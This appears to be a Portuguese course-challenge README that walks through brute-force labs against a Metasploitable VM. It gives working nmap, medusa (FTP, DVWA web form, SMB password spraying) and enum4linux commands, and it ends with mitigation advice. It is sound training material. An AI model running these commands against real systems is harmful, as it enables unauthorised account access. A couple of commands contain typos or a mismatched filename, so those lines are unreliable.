# DIO-Brute-Force-medusa
Repositório para o desafio de Brute Force utilizando medusa da DIO

## Brute force
ataques que utilizam força bruta para descobrir credenciais forçando combinações, credenciais comuns ou vazadas e variações delas.

- Ataques brute force podem ser:
- Dicionário: utilizam um arquivo de texto (wordlist) com credenciais simples e comuns ou obtidas através de vazamentos de dados.
- Permutação: cria todas as combinações possíveis até encontrar uma combinação que libera acesso ao sistema invadido.
- Híbrido: combina dicionários com alterações inteligentes de modo a imitar o comportamento humano ao criar uma nova senha.
- Password spraying: ao invés de tentar diversas senhas para um mesmo usuário, tenta acessar utilizando a mesma senha para diferentes usuários (sejam eles obtidos por vazamento ou enumeração).

## Principais ferramentas do Kali para realizar ataques brute force:
- Medusa: alta velocidade e escalabilidade para ataques em rede. Suporte a vários protocolos e permite utilizar threads para realizar o ataque. Permite utilizar parâmetros para realizar o ataque
- Hydra: baseada em rede e compatível com vários protocolos comuns e bancos de dados. Permite utilizar diversas threads para ataque.
- Ncrack: permite integração com enumeração do nmap. Suporte a diversos protocolos comuns. Otimizado para redes maiores e distribuídas, além de modo stealth.
- Jhon the Ripper: utilizada especificamente para descobrir a senha real quando já obteve o hash criptografado da senha. Funciona de maneira offline.
- Wpscan: utilizada especificamente para ataques ao wordpress, utiliza um banco de dados de exploits do wordpress mantido pela própria ferramenta.
- Patator: flexível, modular e personalizável, porém mais difícil de utilizar. Suporta muitos protocolos e permite ajuste fino do ataque.

# Ataques à máquina Metaspoitable:
- Descobrir as portas abertas após descobrir o IP da máquina utilizando nmap:
`nmap -sV -p 21,22,80,445,139 192.168.56.101`
-sV -> mostra a versão de cada serviço aberto
-p -> seleção de portas para verificar

- Criação de wordlists para ataque ao serviço ftp:
`echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt`
cria uma wordlist 'users.txt' com os logins passados

`echo -r '123456\npassword\nqwerty\nmsfadmin' > pass.txt`
cria uma wordlist 'pass.txt' com as senhas passadas

- Ataque brute force com medusa para descobrir o usuário e senha a partir de wordlists:
`medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6`
-h -> define o IP alvo
-U -> define a wordlist de usuários
-P -> define a wordlist de senhas
-M -> define o protocolo
-t -> define a quantidade de threads

- Ataque a um formulário web DVWA utilizando medusa a partir de wordlists:
encontrar como o front se comunica com o back na aba Network e quais os nomes dos campos utilizados.
`medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6`
indica quais wordlists deve utilizar para usuário e senha, qual endpoint do alvo deve ser utilizado, quais os campos devem ser preenchidos e qual a mensagem de falha

- Enumeração com enum4linux para encontrar os usuários smb do alvo:
`enum4linux -a 192.168.56.101 | tee enum4_output.txt`
-a -> indica o IP alvo
| tee -> exibe o retorno no terminal e também cria um arquivo com ele

- Criando wordlist com os usuários smb encontrados:
`echo -e 'user\nmsfadmin\nservice' > smb_users.txt`
cria uma wordlist 'smb_users.txt' com os usuários passados

`echo -e 'password\n123456\nWelcome123\nmsfadmin' > smb_users.txt`
cria uma wordlist 'senhas_spray.txt' com as senhas passadas

- Ataque password spraying com medusa para descobrir o usuário e senha a partir de wordlists:
`medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50`
-T -> indica o delay entre as tentativas

## Mitigação de riscos:
Esses ataques podem ser combatidos através da configuração correta do ambiente, fechando portas que não estão sendo utilizadas, utilizando subredes para acessar os serviços internos, utilizando senhas complexas e fortes, exigindo senhas complexas dos demais usuários internos, realizando trocas das senhas com frequência e verificando se alguma credencial foi vazada e alterando-a caso seja vazada.
